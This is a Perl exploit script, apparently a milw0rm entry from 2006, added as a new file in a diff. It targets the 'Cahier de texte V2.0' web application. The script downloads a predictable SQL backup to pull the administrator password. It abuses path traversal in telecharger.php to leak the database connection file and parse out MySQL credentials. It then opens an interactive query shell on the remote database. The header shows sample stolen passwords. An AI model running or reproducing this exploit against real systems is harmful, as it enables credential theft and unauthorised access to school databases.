@@ -1,0 +1,129 @@
+#!/usr/bin/perl
+#
+#
+# INFORMATIONS
+# ============
+# Affected.scr..: Cahier de texte V2.0
+# Poc.ID........: 15061124
+# Type..........: Predictable backup filename, Source disclosure
+# Risk.level....: High
+# Conditions....: register_globals = on
+# Src.download..: www.etab.ac-caen.fr/bsauveur/cahier_de_texte/
+# Poc.link......: acid-root.new.fr/poc/15061124.txt
+# Credits.......: DarkFig
+# Note..........: Coded for fun
+#
+#
+# SCREENSHOT
+# ==========
+# header> Cahier de texte V2.0 SQL Code Execution Exploit
+# header> -----------------------------------------------
+# status> Searching the backup file
+# sploit> Administrateur::epolas
+# status> Downloading database informations
+# sploit> Host::sql.mysite.com
+# sploit> Database::cahier_de_texte
+# sploit> Username::root
+# sploit> Password::toor
+# status> Contacting the mysql server
+# _mysql> select * from cdt_prof
+# +-------+--------------+---------+
+# |ID_prof|nom_prof      |passe    |
+# +-------+--------------+---------+
+# |      1|Administrateur|epolas   |
+# |      2|DarkFig       |crazypass|
+# +-------+--------------+---------+
+# 2 rows processed
+#
+# _mysql> exit
+#
+use MySQL;
+use Getopt::Long;
+use LWP::UserAgent;
+use HTTP::Response;
+use HTTP::Request::Common;
+
+print STDOUT "\nheader> Cahier de texte V2.0 SQL Code Execution Exploit";
+print STDOUT "\nheader> ", "-" x 47, "\n";
+
+$opt = GetOptions(
+         'host=s'   =>  \$host,
+         'path=s'   =>  \$path,
+         'proxh=s'  =>  \$proxh,
+         'proxu=s'  =>  \$proxu,
+         'proxp=s'  =>  \$proxp);
+
+if(!$host) {
+    print STDOUT "header> Usage: ./xXx.pl --host=[www] --path=[/] [Opts]\n";
+    print STDOUT "header> [Opts] --proxh=[ip] --proxu=[user] --proxp=[pwd]\n";
+    exit(1);
+}
+
+$host = $host !~ /^http:\/\// ? "http://$host" : $host;
+$path = defined($path) ? $path : "/";
+
+$ua = LWP::UserAgent->new();
+$ua->agent('0xzilla');
+$ua->timeout(30);
+$ua->proxy(['http'] => $proxh) if $proxh;
+$re->proxy_authorization_basic($proxu, $proxp) if $proxp;
+
+# First vulnerability
+# ===================
+# The backup's filename is allways the same
+# If the file is protected by a .htaccess file,
+# use the source disclosure vulnerability to get it.
+# There is also all members passwords but here we
+# just take the administrator password.
+
+print STDOUT "status> Searching the backup file\n";
+$re  = GET $host.$path.'administration/dump.sql';
+$res = $ua->request($re);
+
+if($res->as_string !~ /HTTP\/1.(x|1) 404 Not Found/) {
+if($res->content =~ /INSERT INTO cdt_prof VALUES\(1, 'Administrateur', '(.*?)'\);/) {
+print STDOUT "sploit> Administrateur::$1\n";}} else {
+print STDOUT "sploit> None backup found\n";}
+
+# Second vulnerability
+# ====================
+# Source disclosure in administration/telecharger.php
+
+print STDOUT "status> Downloading database informations\n";
+$ch  = '../Connections/conn_cahier_de_texte.php&Fichier_a_telecharger=';
+$re  = GET $host.$path."administration/telecharger.php?chemin=$ch";
+$res = ($ua->request($re))->content;
+
+if($res =~  /\$hostname_conn_cahier_de_texte([\s]*)=([\s]*)"(.*?)";([\s]*)(||
+            )\$database_conn_cahier_de_texte([\s]*)=([\s]*)"(.*?)";([\s]*)(||
+            )\$username_conn_cahier_de_texte([\s]*)=([\s]*)"(.*?)";([\s]*)(||
+            )\$password_conn_cahier_de_texte([\s]*)=([\s]*)"(.*?)";([\s]*)/) {
+
+$mhost=$3; $database=$8; $username=$13; $password=$18;
+print STDOUT "sploit> Host::$mhost\nsploit> Database::$database\n";
+print STDOUT "sploit> Username::$username\nsploit> Password::$password\n";} else {
+print STDOUT "sploit> Exploit failed\n";
+exit(1);}
+
+if($mhost =~ /^(localhost|127\.0\.0\.1)$/ or !$mhost) {
+print STDOUT "sploit> MySQL server is localhost\n";
+exit(1);}
+
+# Third step
+# ==========
+# Trying a connection with the MySQL server
+
+print STDOUT "status> Contacting the mysql server\n";
+$dbh = Mysql->connect($mhost, $database, $username, $password);
+$dbh->selectdb($database);
+
+while() {
+   print STDOUT "_mysql> ";
+   chomp($query = <STDIN>);
+
+   $query =~ /^(exit||quit)$/   ? exit(0)               : 0x2727;
+   $res   = $dbh->query($query) ? $dbh->query($query)   : $dbh->errmsg();
+   $res  != $dbh->errmsg()      ? print $res->as_string : 0x2727;
+}
+
+# milw0rm.com [2006-11-24]
